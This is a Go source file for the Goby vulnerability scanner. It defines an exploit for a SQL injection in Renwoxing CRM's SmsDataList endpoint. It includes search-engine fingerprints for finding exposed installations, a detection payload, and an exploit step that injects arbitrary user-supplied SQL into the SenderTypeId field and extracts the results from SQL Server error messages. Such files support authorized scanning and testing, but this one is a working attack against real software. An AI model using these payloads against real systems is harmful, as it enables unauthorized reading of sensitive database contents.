package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Renwoxing CRM SmsDataList SQL injection vulnerability",
    "Description": "<p>Renwoxing CRM system is a customer relationship management software that integrates office automation, goal management, knowledge management, and human resources.</p><p>There is a SQL injection vulnerability in Ren Woxing CRM SmsDataList, through which attackers can obtain sensitive database information.</p>",
    "Product": "Renwu-CRM",
    "Homepage": "https://www.wecrm.com/",
    "DisclosureDate": "2022-07-24",
    "Author": "橘先生",
    "FofaQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "GobyQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in Ren Woxing CRM SmsDataList, through which attackers can obtain sensitive database information.</p>",
    "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:<a href=\"http://www.kfgjp.cn/\">http://www.kfgjp.cn/</a></p><p></p><p><a href=\"https://pandorafms.com/\"></a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "system_user",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SMS/SmsDataList/?pageIndex=1&pageSize=30",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0xe10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SMS/SmsDataList/?pageIndex=1&pageSize=30",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,({{{sql}}})) AND 'CvNI'='CvNI"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "在将 nvarchar 值 '",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|在将 nvarchar 值 '(.*?)' 转换成数据类型 int 时失败"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "任我行 CRM SmsDataList SQL 注入漏洞",
            "Product": "任我行-CRM",
            "Description": "<p>任我行 CRM 系统是客户关系管理，集自动化办公、目标管理、知识管理、人力资源为一体集成的企业管理软件。</p><p>任我行 CRM SmsDataList 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息等。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"http://www.kfgjp.cn/\">http://www.kfgjp.cn/</a></p><p><a target=\"_Blank\" href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p>任我行 CRM SmsDataList 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息等。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Renwoxing CRM SmsDataList SQL injection vulnerability",
            "Product": "Renwu-CRM",
            "Description": "<p>Renwoxing CRM system is a customer relationship management software that integrates office automation, goal management, knowledge management, and human resources.</p><p>There is a SQL injection vulnerability in Ren Woxing CRM SmsDataList, through which attackers can obtain sensitive database information.</p>",
            "Recommendation": "<p style=\"text-align: justify;\">At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:<a href=\"http://www.kfgjp.cn/\">http://www.kfgjp.cn/</a></p><p style=\"text-align: justify;\"></p><p style=\"text-align: justify;\"><a href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p>There is a SQL injection vulnerability in Ren Woxing CRM SmsDataList, through which attackers can obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-23",
    "PocId": "7305"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}